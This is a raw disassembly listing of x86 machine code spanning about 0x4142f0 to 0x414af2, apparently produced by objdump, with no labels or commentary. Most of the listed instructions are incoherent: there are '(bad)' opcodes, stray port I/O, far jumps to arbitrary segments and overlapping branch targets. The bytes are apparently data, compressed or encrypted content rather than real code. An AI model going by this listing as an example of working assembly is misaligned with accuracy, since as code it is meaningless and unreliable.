  4142f0:	add    dl,BYTE PTR [edi-0x7e]
  4142f3:	aas    
  4142f4:	or     eax,0x4702d9e5
  4142f9:	mov    edx,0xfd5ebcf
  4142fe:	lds    esp,FWORD PTR [esi-0x5b288dab]
  414304:	jg     0x4142cf
  414306:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414307:	leave  
  414308:	cmp    ecx,ebx
  41430a:	leave  
  41430b:	outs   dx,DWORD PTR ds:[esi]
  41430c:	aam    0x5e
  41430e:	pop    esi
  41430f:	dec    edx
  414310:	adc    eax,DWORD PTR [edx-0x11]
  414313:	and    sp,bx
  414316:	mov    dh,0xbd
  414318:	xor    DWORD PTR [eax+0x7a301a66],ebp
  41431e:	xchg   esp,eax
  41431f:	sbb    BYTE PTR [ecx],0x8c
  414322:	adc    dl,BYTE PTR [edi-0x24]
  414325:	pop    ebp
  414326:	or     BYTE PTR [ecx],cl
  414328:	shr    DWORD PTR [edx+edx*2+0x39cbd947],cl
  41432f:	push   cs
  414330:	jl     0x41431a
  414332:	mov    dh,0x47
  414334:	js     0x4142c5
  414336:	cmp    ebp,ecx
  414338:	adc    eax,0x8d4b5eb
  41433d:	sub    dl,BYTE PTR [esi]
  41433f:	sbb    ebx,DWORD PTR [edx]
  414341:	xchg   esp,eax
  414342:	inc    ebp
  414343:	stos   DWORD PTR es:[edi],eax
  414344:	pusha  
  414345:	ja     0x4143bb
  414347:	dec    eax
  414348:	imul   ebx,esi,0x5a
  41434b:	or     esp,esp
  41434d:	repnz push 0x9a8b8e8e
  414353:	not    BYTE PTR [ebx-0x1ba2e598]
  414359:	adc    BYTE PTR [esi+0x3bf481f9],dl
  41435f:	shr    DWORD PTR [eax+0x5d],cl
  414362:	test   DWORD PTR [edx],ecx
  414364:	jl     0x41437a
  414366:	imul   edi,ecx,0xffffff88
  414369:	jle    0x4143b4
  41436b:	in     al,0x8b
  41436d:	popf   
  41436e:	mov    eax,ds:0xc9c8e890
  414373:	enter  0xaa6d,0xd2
  414377:	and    BYTE PTR [ecx+edx*1],bh
  41437a:	xchg   ebp,eax
  41437b:	test   BYTE PTR [ecx+ebx*4+0x4a],dh
  41437f:	xchg   esp,eax
  414380:	enter  0x2cb5,0x7f
  414384:	ret    0xc75e
  414387:	shl    BYTE PTR [edi+0x69875d8c],cl
  41438d:	mov    dh,0x8
  41438f:	call   0xc557:0x6b6a9c8
  414396:	(bad)  
  414397:	(bad)  
  414398:	jnp    0x414412
  41439a:	mov    esp,0x88233e2b
  41439f:	or     DWORD PTR [ecx+0x69f246fd],ecx
  4143a5:	mov    ?,WORD PTR [ecx-0x6]
  4143a8:	jg     0x41441b
  4143aa:	jns    0x4143be
  4143ac:	and    al,0x77
  4143ae:	ss mov bh,0x45
  4143b1:	and    BYTE PTR [ebp-0x7ea7d7c9],ch
  4143b7:	fld    QWORD PTR [esi-0x42443cf1]
  4143bd:	test   eax,0xfe95f73b
  4143c2:	adc    bl,BYTE PTR [eax+0x44bf5ec3]
  4143c8:	lods   al,BYTE PTR ds:[esi]
  4143c9:	or     dh,bl
  4143cb:	sbb    ch,BYTE PTR [ebx+ebx*2+0x32]
  4143cf:	fnstsw WORD PTR [ebx+0x19]
  4143d2:	cmp    edx,0xa0a66aee
  4143d8:	mov    ds:0x73ae94f9,al
  4143dd:	dec    esp
  4143de:	and    dh,BYTE PTR [edx+edi*8]
  4143e1:	mov    eax,ds:0x7953fc97
  4143e6:	mov    BYTE PTR [ebp-0x10e2ef77],dl
  4143ec:	mov    ebx,cs
  4143ee:	pop    ds
  4143ef:	test   BYTE PTR ds:0xbe61d8e3,0x25
  4143f6:	test   al,0x1d
  4143f8:	mov    ebx,0xbfebaf8d
  4143fd:	xchg   DWORD PTR [edx-0x44],ecx
  414400:	pushf  
  414401:	ffreep st(5)
  414403:	mov    ebx,0x77b80ade
  414408:	mov    ch,BYTE PTR [edx+0x17]
  41440b:	sub    BYTE PTR [edx-0x62f4a48a],dh
  414411:	xchg   ebx,eax
  414412:	out    0xd5,eax
  414414:	jae    0x414461
  414416:	popa   
  414417:	lahf   
  414418:	push   cs
  414419:	mov    eax,ds:0x81f073f
  41441e:	xchg   DWORD PTR [edx],eax
  414420:	loop   0x4143e8
  414422:	rcl    DWORD PTR [edx+0x7f7d90eb],1
  414428:	test   BYTE PTR [esi],0xa4
  41442b:	jmp    0x8e83:0x3b4c188d
  414432:	mov    dl,0x4
  414434:	adc    al,0xb4
  414436:	icebp  
  414437:	add    ebx,DWORD PTR [ebp+ebx*8+0x751b54c9]
  41443e:	pop    ecx
  41443f:	retf   
  414440:	sbb    eax,0x402b9208
  414445:	cmp    DWORD PTR [eiz*2-0x1d6cec9e],ebp
  41444c:	hlt    
  41444d:	mov    ebp,0x8985eddf
  414452:	or     eax,esp
  414454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414455:	das    
  414456:	ds pop ds
  414458:	xor    DWORD PTR [edx+0x4985ef1e],esp
  41445e:	out    0x72,eax
  414460:	jbe    0x41441c
  414462:	test   eax,0x53292a8
  414467:	xchg   ecx,eax
  414468:	cmp    eax,0x64dd26ee
  41446d:	cmp    eax,esi
  41446f:	repz mov bl,dl
  414472:	pushf  
  414473:	div    DWORD PTR [edi+ebx*8-0x57]
  414477:	or     al,0xe0
  414479:	xlat   BYTE PTR ds:[ebx]
  41447a:	mov    ecx,0x58f7827
  41447f:	imul   ebx,DWORD PTR [edi],0x73
  414482:	test   DWORD PTR [ebx],ebp
  414484:	mov    eax,ds:0x59ee404e
  414489:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41448a:	jle    0x414464
  41448c:	fmul   QWORD PTR [edx-0x74ffcd9b]
  414492:	or     ecx,DWORD PTR [ecx-0xf722c30]
  414498:	mov    WORD PTR [eax+0x1d],fs
  41449b:	jb     0x414494
  41449d:	push   ss
  41449e:	cmc    
  41449f:	(bad)  
  4144a0:	repnz fbld TBYTE PTR [edi-0x39]
  4144a4:	lods   eax,DWORD PTR ds:[esi]
  4144a5:	in     al,0xe6
  4144a7:	bnd je 0x4144c9
  4144aa:	scas   al,BYTE PTR es:[edi]
  4144ab:	inc    esi
  4144ac:	xchg   ebp,eax
  4144ad:	cli    
  4144ae:	mov    DWORD PTR [ebx+0x569b01dc],0xc16f0f10
  4144b8:	(bad)  
  4144b9:	pop    edx
  4144ba:	dec    esi
  4144bb:	gs clc 
  4144bd:	aam    0x7c
  4144bf:	dec    ecx
  4144c0:	fldcw  WORD PTR [ebp+eiz*1+0x77]
  4144c4:	test   DWORD PTR [eax+0x4f],edi
  4144c7:	shr    BYTE PTR [esi+0x21],cl
  4144ca:	or     dl,BYTE PTR [ecx-0xbda2f2c]
  4144d0:	aad    0x28
  4144d2:	mov    bh,0x7f
  4144d4:	push   ebp
  4144d5:	jne    0x41446b
  4144d7:	or     eax,0x2190d57c
  4144dc:	cmp    bh,cl
  4144de:	imul   ecx,esi,0xb08507df
  4144e4:	fidivr DWORD PTR [esi+edi*2]
  4144e7:	inc    esi
  4144e8:	adc    edx,esp
  4144ea:	popaw  
  4144ec:	mov    bl,0xc5
  4144ee:	lahf   
  4144ef:	mov    ebx,DWORD PTR [eax+0x1c]
  4144f2:	jno    0x414509
  4144f4:	je     0x414514
  4144f6:	mov    ebp,0x2afd7b90
  4144fb:	in     al,0x4d
  4144fd:	shl    DWORD PTR ds:0x5c02e1c4,cl
  414503:	push   ss
  414504:	mov    DWORD PTR [ebx-0x6a],esp
  414507:	or     ebp,esi
  414509:	mov    esp,ecx
  41450b:	test   dh,cl
  41450d:	jnp    0x41451e
  41450f:	cmp    BYTE PTR [ebx-0x63ba83b3],0xe2
  414516:	xchg   BYTE PTR [edx],ah
  414518:	add    al,0xd8
  41451a:	mov    al,ds:0x45ce3f7d
  41451f:	mov    ax,0x55e3
  414523:	and    BYTE PTR [ecx+0x6461beff],0xfc
  41452a:	js     0x414519
  41452c:	iret   
  41452d:	mov    cl,0xec
  41452f:	fldenv [edx+edx*4-0x24b0c5e4]
  414536:	xor    dl,BYTE PTR ds:0xa278c7ca
  41453c:	xor    ecx,DWORD PTR [ebp-0x6f998ee2]
  414542:	lahf   
  414543:	jp     0x414583
  414545:	jp     0x41452e
  414547:	fistp  QWORD PTR [eax]
  414549:	sub    esi,ebp
  41454b:	mov    esp,?
  41454d:	sub    dl,ch
  41454f:	das    
  414550:	cmc    
  414551:	push   ds
  414552:	clc    
  414553:	imul   edx,DWORD PTR [edx+0x50394609],0x3d1eb619
  41455d:	sbb    BYTE PTR [eax+0x7f],ch
  414560:	cwde   
  414561:	imul   ecx,DWORD PTR [eax-0x71],0x21
  414565:	cmp    DWORD PTR [edi+0x1a6551df],0x9af92a03
  41456f:	push   ebx
  414570:	nop
  414571:	sub    eax,0xe46fb271
  414576:	or     ecx,ecx
  414578:	cmp    BYTE PTR [ebx-0x1e],cl
  41457b:	mov    al,0x17
  41457d:	bound  ebp,QWORD PTR [edx+0x6a]
  414580:	or     BYTE PTR [esi-0x1c4e048b],dl
  414586:	and    al,0x59
  414588:	jmp    0x41457a
  41458a:	outs   dx,BYTE PTR ds:[esi]
  41458b:	mov    edx,0xf37f88c3
  414590:	jbe    0x414610
  414592:	ins    DWORD PTR es:[edi],dx
  414593:	or     edx,eax
  414595:	stc    
  414596:	fisttp DWORD PTR [edx+edx*2+0x482974f9]
  41459d:	into   
  41459e:	loope  0x41461c
  4145a0:	sub    eax,0x2cd6505
  4145a5:	int    0x78
  4145a7:	jge    0xb364aad4
  4145ad:	arpl   WORD PTR [ebx+edx*1-0x2d],bp
  4145b1:	aad    0x71
  4145b3:	adc    al,0x80
  4145b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145b6:	ja     0x41458b
  4145b8:	cmp    eax,0xc6fc47f8
  4145bd:	mov    eax,0x62a5f22b
  4145c2:	and    dl,ch
  4145c4:	push   cs
  4145c5:	outs   dx,BYTE PTR ds:[esi]
  4145c6:	imul   ecx,DWORD PTR [edi],0xffffffd8
  4145c9:	inc    ebp
  4145ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145cb:	jne    0x414641
  4145cd:	icebp  
  4145ce:	mov    bh,0x35
  4145d0:	and    eax,0x11b79168
  4145d5:	pop    ss
  4145d6:	and    ch,BYTE PTR [eax+0x3ecc0889]
  4145dc:	loop   0x414643
  4145de:	mov    DWORD PTR [esi+ebp*8+0x40],ebp
  4145e2:	stc    
  4145e3:	test   al,0xe5
  4145e5:	pusha  
  4145e6:	jp     0x41459b
  4145e8:	fild   DWORD PTR [edi]
  4145ea:	cs loope 0x4145b7
  4145ed:	xchg   DWORD PTR [edi],eax
  4145ef:	imul   ebx,DWORD PTR [edx],0xe225372e
  4145f5:	dec    ebp
  4145f6:	out    0x8,al
  4145f8:	jns    0x4145d6
  4145fa:	lods   ax,WORD PTR ds:[esi]
  4145fc:	loope  0x4145c8
  4145fe:	adc    DWORD PTR [ebp-0x39eee1b9],edx
  414604:	sub    BYTE PTR [eax],ah
  414606:	js     0x4145a8
  414608:	pop    edi
  414609:	cwde   
  41460a:	ss aaa 
  41460c:	lea    ebp,[edx+0x6d]
  41460f:	hlt    
  414610:	adc    BYTE PTR ds:0xcd43685e,ah
  414616:	leave  
  414617:	pop    edx
  414618:	mov    al,ds:0x1c0e924
  41461d:	inc    eax
  41461e:	dec    ecx
  41461f:	inc    BYTE PTR [ebp+0x6e]
  414622:	iret   
  414623:	adc    ebp,0xfffffffc
  414626:	cmp    DWORD PTR [edi],eax
  414628:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414629:	dec    edi
  41462a:	dec    edi
  41462b:	mov    al,ds:0xc0b7b95d
  414630:	adc    DWORD PTR [esi+0x5b131e27],eax
  414636:	mov    ecx,0x66b407cc
  41463b:	mov    al,0x3c
  41463d:	mov    dh,0x81
  41463f:	outs   dx,DWORD PTR ds:[esi]
  414640:	(bad)  
  414641:	das    
  414642:	adc    edi,ecx
  414644:	or     al,BYTE PTR [ebx]
  414646:	lods   al,BYTE PTR ds:[esi]
  414647:	les    esp,FWORD PTR [esi]
  414649:	push   ds
  41464a:	mov    edx,0xa4a821f3
  41464f:	jne    0x4145d4
  414651:	mov    DWORD PTR [eax-0x4e],ebx
  414654:	bnd jae 0x414621
  414657:	jae    0x4145ff
  414659:	bound  eax,QWORD PTR [ebx]
  41465b:	neg    ah
  41465d:	adc    DWORD PTR [ecx+0x5770f74f],edx
  414663:	mov    cl,0x1c
  414665:	rcr    eax,0x3f
  414668:	icebp  
  414669:	retf   
  41466a:	mov    dh,0x93
  41466c:	xchg   edi,eax
  41466d:	jle    0x41463c
  41466f:	add    eax,0x59df59a0
  414674:	push   edx
  414675:	out    0xf5,eax
  414677:	pop    esi
  414678:	mov    bl,0x8d
  41467a:	mov    cl,0xeb
  41467c:	fisub  WORD PTR [edx+0x54]
  41467f:	cmp    BYTE PTR [ecx+ebp*2+0x53d409e9],ch
  414686:	dec    ecx
  414687:	jmp    0xc838:0xf244cbe
  41468e:	inc    ebp
  41468f:	fs call 0x87f2:0xfe7c8839
  414697:	and    bl,BYTE PTR [ebp+0x639ce33a]
  41469d:	push   0x7c470bd9
  4146a2:	sahf   
  4146a3:	leave  
  4146a4:	outs   dx,BYTE PTR ds:[esi]
  4146a5:	add    BYTE PTR [eax+esi*2+0x5],bl
  4146a9:	mov    ds,WORD PTR [ebp+0x69]
  4146ac:	pop    ebp
  4146ad:	jecxz  0x41464b
  4146af:	xchg   esi,eax
  4146b0:	daa    
  4146b1:	nop    DWORD PTR [ebp-0x3c30b2a2]
  4146b8:	or     eax,0x68be4d54
  4146bd:	clc    
  4146be:	or     dh,BYTE PTR [ebx+0x44]
  4146c1:	xor    edx,ebp
  4146c3:	ja     0x4146e7
  4146c5:	or     ah,dh
  4146c7:	push   0xd31f0071
  4146cc:	pop    esp
  4146cd:	mov    al,0xf4
  4146cf:	push   ecx
  4146d0:	xchg   BYTE PTR [eax-0x3e],dl
  4146d3:	fmul   QWORD PTR [ebx+0x50719658]
  4146d9:	adc    DWORD PTR [edi-0x4d628e8f],0xffffff9d
  4146e0:	cwde   
  4146e1:	xor    dh,BYTE PTR [esi-0x3f]
  4146e4:	xor    eax,0x58b24e18
  4146e9:	sub    al,0x13
  4146eb:	jp     0x414701
  4146ed:	dec    ebp
  4146ee:	pop    eax
  4146ef:	outs   dx,BYTE PTR ds:[esi]
  4146f0:	lock cmp DWORD PTR [ecx],ecx
  4146f3:	ja     0x41469a
  4146f5:	pop    ebp
  4146f6:	imul   esp,edi,0x1a
  4146f9:	retf   0x67f8
  4146fc:	(bad)  
  4146fd:	cmp    ebx,edx
  4146ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414700:	repnz add esp,DWORD PTR [eax]
  414703:	dec    esp
  414704:	std    
  414705:	repnz xchg eax,edx
  414708:	jmp    0x79ed:0xa0fa973a
  41470f:	cmp    BYTE PTR [esi+esi*8-0x140e8c65],ah
  414716:	adc    ch,BYTE PTR [edx]
  414718:	mov    edi,0xbb6346f6
  41471d:	in     al,dx
  41471e:	arpl   ax,cx
  414720:	mov    al,0x2b
  414722:	sbb    DWORD PTR [edx-0x15],edi
  414725:	mov    eax,ds:0x73f4fb7c
  41472a:	(bad)  
  41472b:	fwait
  41472c:	mov    esp,DWORD PTR [ebp+0x4b]
  41472f:	add    DWORD PTR [ebp+0x79],edi
  414732:	stos   BYTE PTR es:[edi],al
  414733:	test   BYTE PTR [esi-0xb7d4b5c],0x99
  41473a:	mov    al,0xab
  41473c:	mov    ds:0xf8c47985,eax
  414741:	shl    eax,0x3d
  414744:	les    ecx,FWORD PTR [edx+0x2f]
  414747:	stos   BYTE PTR es:[edi],al
  414748:	jb     0x4147b2
  41474a:	cld    
  41474b:	mov    edx,0x3127bfe5
  414750:	pop    ebx
  414751:	imul   esp,esi,0x2
  414754:	sub    BYTE PTR [eax-0x2f1ddd80],bh
  41475a:	jmp    0x4a5:0x1ad26735
  414761:	cmp    BYTE PTR [ecx-0x59367849],dl
  414767:	push   ss
  414768:	loop   0x4146fc
  41476a:	aad    0x5f
  41476c:	imul   ebx,DWORD PTR [ecx+ebp*1-0x15f0385f],0x19
  414774:	ins    DWORD PTR es:[edi],dx
  414775:	pop    esi
  414776:	sub    esi,DWORD PTR [ebx+0x48698288]
  41477c:	mov    esi,0x7083b32c
  414781:	pop    ds
  414782:	mov    BYTE PTR [edx+0x29],ch
  414785:	lock rol BYTE PTR [ebx-0x422881b1],1
  41478c:	imul   ebp,DWORD PTR [ebp-0x18],0xffffffa6
  414790:	jno    0x4147c4
  414792:	mov    esi,0x1b8f5f1f
  414797:	inc    ebx
  414798:	stos   BYTE PTR es:[edi],al
  414799:	jno    0x4147eb
  41479b:	test   al,0xb2
  41479d:	enter  0x8db7,0xc1
  4147a1:	xchg   edx,eax
  4147a2:	xchg   esp,eax
  4147a3:	call   0x49b681a5
  4147a8:	xor    al,0x69
  4147aa:	fstp   DWORD PTR [edi+0x71bae6fc]
  4147b0:	xchg   ebx,eax
  4147b1:	jb     0x4147b8
  4147b3:	sub    BYTE PTR [esi-0x44b3dffc],bh
  4147b9:	imul   ecx,edi,0xa
  4147bc:	pop    esp
  4147bd:	fst    DWORD PTR [ebp+esi*1-0x258a4907]
  4147c4:	mov    bh,0xa5
  4147c6:	mov    esp,es
  4147c8:	mov    ch,0x38
  4147ca:	bound  esi,QWORD PTR [ebx-0x3f]
  4147cd:	popa   
  4147ce:	push   ds
  4147cf:	frstor gs:[edi+0x5d5d3719]
  4147d6:	push   esp
  4147d7:	scas   al,BYTE PTR es:[edi]
  4147d8:	cmc    
  4147d9:	push   ds
  4147da:	mov    dh,0xef
  4147dc:	mov    DWORD PTR [ebx-0x5f],edi
  4147df:	jmp    0x4147da
  4147e1:	pextrw ebp,(bad),0xc5
  4147e3:	push   0x54
  4147e5:	daa    
  4147e6:	or     eax,0xead4b150
  4147eb:	in     al,0x44
  4147ed:	outs   dx,DWORD PTR ds:[esi]
  4147ee:	leave  
  4147ef:	mov    edi,0xc01dc2d3
  4147f4:	scas   eax,DWORD PTR es:[edi]
  4147f5:	push   0xe5a77885
  4147fa:	and    DWORD PTR [di+0x20],ebx
  4147fe:	(bad)  
  414800:	imul   esp,DWORD PTR [eax-0x68b6a3b6],0x68e6b52f
  41480a:	mov    edx,0x49ffa609
  41480f:	fldcw  WORD PTR [esi]
  414811:	icebp  
  414812:	adc    edi,ecx
  414814:	fmul   QWORD PTR [esi-0x45]
  414817:	les    edi,FWORD PTR [ebx+0x6e4846ed]
  41481d:	xchg   esi,eax
  41481e:	(bad)  
  41481f:	das    
  414820:	xor    edi,DWORD PTR [edx+0x3e]
  414823:	adc    ch,BYTE PTR [esi-0x5c]
  414826:	push   ds
  414827:	test   al,dl
  414829:	jb     0x414810
  41482b:	out    0x62,al
  41482d:	ror    ebp,1
  41482f:	rol    BYTE PTR [ebx+0x2f],1
  414832:	push   eax
  414833:	fnstcw WORD PTR [ebx]
  414835:	(bad)  
  414837:	jne    0x4147e9
  414839:	ins    DWORD PTR es:[edi],dx
  41483a:	cmp    dl,BYTE PTR [edx+0x3b]
  41483d:	hlt    
  41483e:	loopne 0x4147d6
  414840:	shl    DWORD PTR [eax+0x107dc87f],cl
  414846:	add    DWORD PTR [esi-0x2f4c51ec],ebp
  41484c:	adc    BYTE PTR [edx-0x1],bh
  41484f:	and    esi,0xf27fe828
  414855:	sbb    DWORD PTR [edi-0x14c75cac],0xf35b7961
  41485f:	adc    al,0x65
  414861:	outs   dx,BYTE PTR ds:[esi]
  414862:	mov    ds:0xe366edc8,eax
  414867:	sub    cl,ah
  414869:	push   esi
  41486a:	and    DWORD PTR [ecx+0xc5980fe],esi
  414870:	in     eax,0x43
  414872:	in     al,0xf2
  414874:	jmp    DWORD PTR [edx-0x53af4b0d]
  41487b:	imul   edx,DWORD PTR [edx],0x29cfacd2
  414881:	xor    DWORD PTR [esi-0xd98074b],ecx
  414887:	sub    dl,BYTE PTR [edx]
  414889:	push   es
  41488a:	jnp    0x414848
  41488c:	ds stos DWORD PTR es:[edi],eax
  41488e:	fldcw  WORD PTR [ebp-0x5a929bfe]
  414894:	shl    BYTE PTR [eax-0x786a0e49],1
  41489a:	or     edi,DWORD PTR [ebx+0x4c6ebdd6]
  4148a0:	pop    ecx
  4148a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148a2:	lds    edi,FWORD PTR [ecx-0x34]
  4148a5:	test   ebx,esi
  4148a7:	fs mov esp,edx
  4148aa:	push   0x60b56d7b
  4148af:	xlat   BYTE PTR ds:[ebx]
  4148b0:	cwde   
  4148b1:	fld    TBYTE PTR [eax]
  4148b3:	jmp    0x507d:0xc2e7e4ca
  4148ba:	sbb    al,0x75
  4148bc:	push   ecx
  4148bd:	ret    
  4148be:	cmp    esi,DWORD PTR [eax+edi*4+0x38]
  4148c2:	into   
  4148c3:	fs test al,0x52
  4148c6:	jle    0x41485a
  4148c8:	push   edx
  4148c9:	mov    cs,WORD PTR [esi]
  4148cb:	push   esp
  4148cc:	(bad)  
  4148cd:	stos   BYTE PTR es:[edi],al
  4148ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148cf:	enter  0xf0c4,0x87
  4148d3:	outs   dx,BYTE PTR ds:[esi]
  4148d4:	mov    edi,0xae64d336
  4148d9:	enter  0xb327,0x12
  4148dd:	ss dec ebp
  4148df:	and    dh,dl
  4148e1:	adc    BYTE PTR ds:0x22453ded,bl
  4148e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148e8:	push   cs
  4148e9:	xor    ebx,0xb2932e60
  4148ef:	dec    ebx
  4148f0:	retf   
  4148f1:	(bad)  
  4148f2:	out    dx,al
  4148f3:	xchg   BYTE PTR [ebp-0x44],dl
  4148f6:	sar    BYTE PTR [edi+0x43e5c9e1],0x6d
  4148fd:	fdiv   st,st(7)
  4148ff:	lea    esi,[ebx-0x3f]
  414902:	xor    al,BYTE PTR [esp+esi*4+0x696ba351]
  414909:	out    dx,al
  41490a:	sub    DWORD PTR [edx-0x41],eax
  41490d:	xchg   edi,eax
  41490e:	pop    esi
  41490f:	outs   dx,DWORD PTR ds:[esi]
  414910:	push   ss
  414911:	push   eax
  414912:	cmp    edi,edx
  414914:	out    0x85,eax
  414916:	mov    ah,ah
  414918:	daa    
  414919:	scas   al,BYTE PTR es:[edi]
  41491a:	out    0x41,eax
  41491c:	rcl    DWORD PTR [esi],cl
  41491e:	aad    0x71
  414920:	and    BYTE PTR [ecx+0x78],bh
  414923:	leave  
  414924:	out    0xa0,al
  414926:	add    eax,0xcef34710
  41492b:	xor    al,0x55
  41492d:	les    ecx,FWORD PTR [eax+0x1cd49049]
  414933:	cmp    DWORD PTR [eax],edi
  414935:	into   
  414936:	hlt    
  414937:	push   0x2eb3da50
  41493c:	in     eax,dx
  41493d:	scas   al,BYTE PTR es:[edi]
  41493e:	clc    
  41493f:	push   0x7123ad8b
  414944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414945:	inc    edx
  414946:	stc    
  414947:	fstp   DWORD PTR [edx+0x12]
  41494a:	mov    bh,0x2d
  41494c:	mov    dl,BYTE PTR [edi+0x52]
  41494f:	pop    esi
  414950:	rcr    BYTE PTR [edx],1
  414952:	cmp    ch,BYTE PTR [ecx]
  414954:	hlt    
  414955:	xchg   ebp,eax
  414956:	dec    eax
  414957:	and    eax,0x651e852e
  41495c:	test   al,0xdc
  41495e:	xchg   esi,eax
  41495f:	mov    edx,DWORD PTR [ebp+0x70]
  414962:	mov    esp,0xf1f0829d
  414967:	push   ss
  414968:	nop
  414969:	mov    ch,0xe3
  41496b:	stos   BYTE PTR es:[edi],al
  41496c:	sbb    eax,0x142fd73b
  414971:	es jae 0x4148f4
  414974:	scas   al,BYTE PTR es:[edi]
  414975:	or     eax,0x792130ea
  41497a:	mov    ah,0x8c
  41497c:	shl    BYTE PTR [esi+0x6a],0x7f
  414980:	jle    0x414904
  414982:	mov    al,ds:0xc8ee9f6e
  414987:	retf   0xc6b2
  41498a:	and    eax,0xa533412e
  41498f:	div    BYTE PTR [edx+0x57383bf9]
  414995:	push   edx
  414996:	loope  0x41498a
  414998:	push   es
  414999:	jmp    0x4149f8
  41499b:	jnp    0x4149e1
  41499d:	mov    edi,0x74551b86
  4149a2:	jp     0x414939
  4149a4:	mov    ch,0xd2
  4149a6:	xchg   edx,eax
  4149a7:	sbb    al,dl
  4149a9:	xor    ah,BYTE PTR [esi]
  4149ab:	cmp    esp,edx
  4149ad:	test   al,0xb
  4149af:	mov    cl,dl
  4149b1:	in     eax,dx
  4149b2:	leave  
  4149b3:	pop    edx
  4149b4:	add    al,BYTE PTR [ecx+esi*8+0x5d]
  4149b8:	add    al,0xc8
  4149ba:	jmp    0xc46c:0x9600da05
  4149c1:	dec    edx
  4149c2:	mov    ecx,0x47ea3815
  4149c7:	cli    
  4149c8:	or     BYTE PTR ds:0xe953e315,0xac
  4149cf:	sti    
  4149d0:	mov    ah,0xa7
  4149d2:	jle    0x4149a1
  4149d4:	pop    ss
  4149d5:	repnz inc ecx
  4149d7:	push   edi
  4149d8:	jl     0x41495d
  4149da:	in     eax,0x33
  4149dc:	jbe    0x4149ab
  4149de:	pop    DWORD PTR [edx+0x481d39bf]
  4149e4:	ficomp DWORD PTR [eax]
  4149e6:	rol    BYTE PTR [ecx-0x6a],1
  4149e9:	or     ch,BYTE PTR [ebx-0x20609d51]
  4149ef:	pop    ebx
  4149f0:	cdq    
  4149f1:	sbb    eax,0x7b2804dd
  4149f6:	mov    dl,0x5e
  4149f8:	push   ebp
  4149f9:	push   ebp
  4149fa:	fxch   st(4)
  4149fc:	aas    
  4149fd:	daa    
  4149fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149ff:	sub    ebx,DWORD PTR [eax+0x3d9ac034]
  414a05:	add    dl,BYTE PTR [ebp-0x3ef2f12d]
  414a0b:	mov    esp,0xe1fe5a70
  414a10:	enter  0xd8c0,0x32
  414a14:	add    BYTE PTR [eax+0x28],dh
  414a17:	sub    dl,al
  414a19:	mov    edx,0x7dfb5deb
  414a1e:	xor    BYTE PTR [ebp-0x62],cl
  414a21:	mov    dh,0x20
  414a23:	push   esi
  414a24:	pop    ebp
  414a25:	mov    ds:0x2c40ce88,eax
  414a2a:	push   edx
  414a2b:	sbb    eax,0xf3878e3e
  414a30:	push   esi
  414a31:	xchg   esi,eax
  414a32:	jne    0x4149e8
  414a34:	pop    edx
  414a35:	jae    0x4149ea
  414a37:	cmp    eax,0xaa298037
  414a3c:	push   ds
  414a3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a3e:	cmp    edx,DWORD PTR [eax-0x3dbc1783]
  414a44:	mov    ah,0x6f
  414a46:	cmp    DWORD PTR [edi-0x4],edx
  414a49:	outs   dx,BYTE PTR ds:[esi]
  414a4a:	push   esp
  414a4b:	sar    ah,1
  414a4d:	shl    BYTE PTR [ecx],cl
  414a4f:	jp     0x414a08
  414a51:	sahf   
  414a52:	xchg   edi,eax
  414a53:	mov    bh,0x8f
  414a55:	mov    dl,0xa3
  414a57:	scas   al,BYTE PTR es:[edi]
  414a58:	xchg   ebx,eax
  414a59:	xchg   edi,eax
  414a5a:	xlat   BYTE PTR ds:[ebx]
  414a5b:	fild   WORD PTR [ebx-0x9]
  414a5e:	retf   0x6e6
  414a61:	ret    
  414a62:	xor    BYTE PTR [esi+0x68],dh
  414a65:	lods   eax,DWORD PTR ds:[esi]
  414a66:	aad    0xe5
  414a68:	xor    DWORD PTR [ebp-0x6084a73a],edx
  414a6e:	ret    
  414a6f:	mov    bh,0x21
  414a71:	add    eax,0x7547770c
  414a76:	pop    edi
  414a77:	loop   0x414aaf
  414a79:	push   eax
  414a7a:	add    bh,BYTE PTR [ebx]
  414a7c:	sar    BYTE PTR [esi-0x63d0eaff],1
  414a82:	jmp    0x123cc219
  414a87:	cmp    ebp,DWORD PTR [edx+eiz*2]
  414a8a:	mov    BYTE PTR [bx+si+0x5b],bl
  414a8e:	sub    DWORD PTR [esi],edx
  414a90:	fnstsw WORD PTR [ebx+0x37]
  414a93:	test   DWORD PTR [ebx-0x45cfd5a6],ebp
  414a99:	sbb    al,0xa5
  414a9b:	pop    edx
  414a9c:	push   es
  414a9d:	pop    esp
  414a9e:	jnp    0x414af4
  414aa0:	push   eax
  414aa1:	mov    bh,0x30
  414aa3:	jge    0x414aed
  414aa5:	mov    dl,0x29
  414aa7:	mov    edx,DWORD PTR [esp+eax*1]
  414aaa:	xchg   ebx,eax
  414aab:	aas    
  414aac:	pop    ds
  414aad:	repz push edx
  414aaf:	inc    esp
  414ab0:	pop    ebx
  414ab1:	push   ds
  414ab2:	ins    BYTE PTR es:[edi],dx
  414ab3:	inc    esi
  414ab4:	jno    0x414a56
  414ab6:	imul   ebx,DWORD PTR [ebp-0x35],0x357f42cb
  414abd:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414abf:	push   edi
  414ac0:	(bad)  
  414ac2:	or     DWORD PTR [edx],esi
  414ac4:	jmp    0x414af7
  414ac6:	std    
  414ac7:	pop    ss
  414ac8:	sub    ah,BYTE PTR [ebx-0x62525f0a]
  414ace:	and    eax,0xe598e000
  414ad3:	mov    eax,0x516c4e1d
  414ad8:	popf   
  414ad9:	xor    DWORD PTR [edi+0x73],esp
  414adc:	(bad)  
  414add:	(bad)  
  414ade:	call   0x34bc18c3
  414ae3:	mov    edx,0x80223184
  414ae8:	popa   
  414ae9:	(bad)  
  414aea:	sbb    al,0xcf
  414aec:	and    BYTE PTR [edi+0x46667055],cl
  414af2:	test   al,0xe6
